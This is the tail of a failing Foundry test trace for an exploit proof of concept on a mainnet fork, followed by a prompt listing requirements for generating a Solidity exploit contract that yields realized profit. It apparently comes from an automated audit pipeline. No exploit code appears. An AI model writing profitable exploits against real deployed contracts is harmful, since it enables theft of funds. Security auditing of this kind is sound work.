    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   └─ ← [Stop]
    ├─ [592] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xAe9aCa5d20F5b139931935378C4489308394ca2C)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14421983 [1.442e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 14264 [1.426e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 100.23ms (32.23ms CPU time)

Ran 1 test suite in 128.79ms (100.23ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 878783)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
